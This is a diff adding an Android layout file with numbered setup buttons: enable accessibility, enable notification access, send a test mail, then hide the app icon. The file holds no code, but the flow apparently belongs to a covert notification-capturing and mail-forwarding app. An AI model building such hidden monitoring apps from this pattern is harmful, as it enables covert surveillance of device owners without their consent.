@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".MainActivity">
+
+    <TextView
+        android:id="@+id/roottxet"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_alignTop="@+id/btn_hide"
+        android:layout_marginStart="20dp"
+        android:layout_marginLeft="20dp"
+        android:layout_marginTop="0dp"
+        android:layout_toEndOf="@+id/btn_hide"
+        android:layout_toRightOf="@+id/btn_hide"
+        android:gravity="center_horizontal"
+        android:text="UN"
+        android:textAlignment="center"
+        android:textColor="#F30202"
+        android:textSize="28sp"
+        android:textStyle="bold" />
+
+    <Button
+        android:id="@+id/btn_sendmail"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_below="@+id/btn_hide"
+        android:layout_alignStart="@+id/btn_hide"
+        android:layout_alignLeft="@+id/btn_hide"
+        android:layout_marginStart="0dp"
+        android:layout_marginLeft="0dp"
+        android:layout_marginTop="50dp"
+        android:text="2. Enable Notification Access" />
+
+    <Button
+        android:id="@+id/btn_startservice"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_below="@+id/btn_sendmail"
+        android:layout_alignStart="@+id/btn_sendmail"
+        android:layout_alignLeft="@+id/btn_sendmail"
+        android:layout_marginStart="0dp"
+        android:layout_marginLeft="0dp"
+        android:layout_marginTop="50dp"
+        android:text="3. Send and Test Mail!(Optional)" />
+
+    <Button
+        android:id="@+id/btn_stopservice"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_below="@+id/btn_startservice"
+        android:layout_alignStart="@+id/btn_startservice"
+        android:layout_alignLeft="@+id/btn_startservice"
+        android:layout_marginStart="0dp"
+        android:layout_marginLeft="0dp"
+        android:layout_marginTop="50dp"
+        android:text="4. Finish And Hide Icon" />
+
+    <Button
+        android:id="@+id/btn_hide"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="1. Enable Accessibility"
+        android:layout_marginTop="50dp"
+        android:layout_marginLeft="50dp"
+        android:layout_marginStart="50dp" />
+
+
+    <Button
+        android:id="@+id/btn_hide_root"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_below="@+id/btn_stopservice"
+        android:layout_alignStart="@+id/btn_stopservice"
+        android:layout_alignLeft="@+id/btn_stopservice"
+        android:layout_marginStart="0dp"
+        android:layout_marginLeft="0dp"
+        android:layout_marginTop="50dp"
+        android:textSize="10dp"
+        android:text="1. Enable Accessibility(Root, Not recommended)" />
+
+</RelativeLayout>
